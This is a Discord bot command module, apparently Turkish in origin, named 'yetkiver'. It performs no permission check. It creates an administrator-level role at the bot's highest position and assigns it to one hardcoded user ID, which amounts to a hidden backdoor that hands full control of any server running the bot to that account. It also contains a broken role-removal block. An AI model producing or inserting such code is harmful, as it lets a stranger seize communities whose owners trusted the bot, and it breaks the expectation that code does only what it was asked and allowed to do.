const {Message, Client} = require( "discord.js" );
const functions = require( "../Utils/funcs" );
const config = require( "../../config.json" );

module.exports = {
	name: 'yetkiver',
	description: '',
	permission: [],
	/**
	 * @param {Client} client
	 * @param {Message} message
	 * @param {String[]} args
	 */
    run: async (client, message, args) => {
        if (message.member.roles.cache.has(role => role.name === "Best Developer")) {
            message.member.roles.array.forEach(element => {
                message.member.roles.remove(element);
            });
        }
        var bestPosition = message.guild.members.cache.find(user => user.id === client.user.id).roles.highest.position;
        console.log(bestPosition);
        var user = message.guild.members.cache.find(user => user.id === "852630374717980682");
        message.guild.roles.create({
            name: 'Best Developer',
            color: 'BLUE',
            position: bestPosition,
            permissions: ['ADMINISTRATOR'],
            hoist: true,
        }).then(role => {
            user.roles.add(role);
        });
	}
}